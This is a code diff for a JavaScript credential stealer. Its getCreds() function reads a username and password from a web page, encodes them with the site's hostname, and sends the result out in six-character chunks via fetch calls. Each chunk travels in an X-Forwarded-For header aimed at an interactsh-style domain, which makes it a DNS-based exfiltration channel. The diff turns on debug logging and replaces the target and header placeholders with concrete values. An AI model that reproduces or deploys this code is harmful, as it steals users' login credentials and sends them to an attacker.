@@ -9,7 +9,7 @@ function toBase64Url(str) {
 }
 
 function getCreds() {
-    const debug = false;
+    const debug = true;
     if (debug) {
         console.log("[*] Looking for credentials...");
     }
@@ -55,8 +55,8 @@ function getCreds() {
                         console.log("[>] Password: ", password);
                         console.log("[>] Domain: ", window.location.hostname);
                         console.log("[*] Sending credentials...");
-                        console.log("[i] Using target url: ", "TARGET_URL");
-                        console.log("[i] Using exfil header: ", "EXFIL_HEADER");
+                        console.log("[i] Using target url: ", "https://example.com/");
+                        console.log("[i] Using exfil header: ", "'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'");
                     }
 
                     const payload = toBase64Url(username + ':' + password + '@' + window.location.hostname);
@@ -66,10 +66,10 @@ function getCreds() {
                     const chunks = payload.match(/.{1,6}/g) || [];
                     chunks.forEach((chunk, index) => {
                         if (debug) {console.log(`[>] Sending chunk ${index + 1}: "${chunk}"`);}
-                        fetch('TARGET_URL', {headers: {EXFIL_HEADER.replace('{{PAYLOAD}}', chunk)}});
+                        fetch('https://example.com/', {headers: {'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'.replace('{{PAYLOAD}}', chunk)}});
                     });
 
-                    fetch('TARGET_URL', {headers: {EXFIL_HEADER}});
+                    fetch('https://example.com/', {headers: {'X-Forwarded-For': '{{PAYLOAD}}.interactshdomain.com'}});
                 }
             };
 
